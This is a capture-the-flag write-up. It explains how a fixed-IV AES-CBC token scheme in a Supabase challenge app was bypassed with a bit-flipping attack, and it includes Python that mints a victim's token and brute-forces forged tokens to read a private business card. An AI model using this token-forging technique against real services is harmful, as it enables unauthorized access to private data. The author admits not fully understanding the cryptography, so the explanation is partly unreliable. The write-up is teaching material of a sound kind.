## YABCG 4.5  

<img src="images/chall.png" width=600>

In this challenge, we are given a similar setup to the YABCG 4, except the webpage now provides a search functionality where we can view other profiles.  

<img src="images/webpage.png" width=600>

Since we need to find John Doe's job description in his business card, the flag is most likely in there.  

Although searching for his email successfully locates his profile, no business cards are rendered.  

<img src="images/empty.png" width=600>

Looking at the code flow for rendering the profile page, we can see that the `/profile` endpoint uses a `mint_token` function from Supabase to generate the queried user's token.  

Unless the current user's email matches the queried email, the access level will default to `public`. This means that John Doe's account probably has a private business card containing the flag.  

If we were able to forge a token with a private access level, we will be able to view all his private business cards.  

```js
// SearchPage.tsx
const { data, error } = await supabase.functions.invoke('mint_token', {
    body: { email }
});

// Edge Functions/mint_token.ts
const { email, exp } = await req.json();

const authHeader = req.headers.get("Authorization");
let access = "public";

if (authHeader) {
    const jwt = authHeader.replace("Bearer ", "");
    const { data } = await supabase.auth.getUser(jwt);
    if (data.user?.email === email) {
        access ="private";
    }
}

// Edge Functions/view_profile/index.ts
let query = supabase
    .from("business_cards")
    .select("*")
    .eq("user_id", uid);

if (access === "public") {
    query = query.eq("public", true);
} else if (access !=="private"){
    return new Response("Invalid access state", {status:400,headers:corsHeaders})
}

const { data, error } = await query;
```

In the source code for `mint_token`, we can see the exact structure of the token payload and the encryption method.  

The backend uses AES-128 CBC encryption with a secret AES key and a fixed IV to generate the token, hinting towards a bit flip attack. If we are able to overwrite the access level in John Doe's token to `private`, we win.  

```js
function pad(buf: Uint8Array): Uint8Array {
  const padLen = 16 - (buf.length % 16);
  return new Uint8Array([...buf, ...Array(padLen).fill(padLen)]);
}
async function encrypt(plaintext: string): Promise<string> {
  console.log("pt",plaintext)
  const iv = new Uint8Array(16)
  const key = await crypto.subtle.importKey(
    "raw",
    new TextEncoder().encode(AES_KEY),
    { name: "AES-CBC" },
    false,
    ["encrypt"]
  );

  const padded = pad(new TextEncoder().encode(plaintext));
  console.log("padenc", padded)
  const ciphertext = await crypto.subtle.encrypt(
    { name: "AES-CBC", iv },
    key,
    padded
  );
  
  
  return btoa(String.fromCharCode(...new Uint8Array(ciphertext)));
}
...
let expfield
if (exp){
    expfield = `exp=${exp}|`
} else {
    expfield =""
}
console.log("uid", data.id)
const tokenPlaintext = `acc=${access}|${expfield}uid=${data.id}`;
```

Since this is a bit flip attack, our goal would be to somehow inject `acc=private` into the token.  

However, since `acc=public` is in the first block and the IV is fixed, we can't flip the bits in that block.  

Looking at the token payload construction again, we will notice an optional `exp` field. If we overwrite its block with a second `acc` field, the JavaScript will ignore the first `acc` block and change our access level.  

```js
{"acc": "public", "acc": "private"}     // --> {acc: 'private'}
```

To give ourselves enough room for the overwrite, we need a `13` digit `exp`, since the first digit will end up in the first block, and our payload is `12` characters long.  

I don't really get it but just know its CBC voodoo.  

```
Block 0 (16 bytes)
[ acc=public|exp=9 ]

Block 1
[ 999999999999 ]   ->   [ |acc=private ]

Block 2
[ |uid=........ ]
```

We can first get the Supabase auth creds in Burpsuite like in YABCG 4, then mint John Doe's token.

<img src="images/auth.png" width=600>

```python
exp = '9' * 13

res = requests.post(f"{DB}/functions/v1/mint_token", headers=headers, json={ 
    'email': 'johndoe@ybn.sg',
    'exp': int(exp)
})
```

After that we can just bruteforce the bit flips until we get a valid token, then query `/view_profile` to see the business card.    

```python
cipher = bytearray(base64.b64decode(token))
BLOCK = 16
old = exp[:-1].encode()

for block in range(1, len(cipher) // BLOCK):
    for offset in range(BLOCK - len(old)):
        test = cipher[:]

        for i in range(len(old)):
            test[block * BLOCK - BLOCK + offset + i] ^= old[i] ^ payload[i]

        forged = base64.b64encode(test).decode()

        res = requests.post(f"{DB}/functions/v1/view_profile", headers=headers, json={"token": forged})

        try:
            flag = re.findall(r'(YBN25\{.+?\})', res.text)[0]
            print("Flag:", flag)
            exit()
        except:
            ...
```

Flag: `YBN25{AES_✂️📋_DONT_REUSE_IV!_n585xihfv023m}`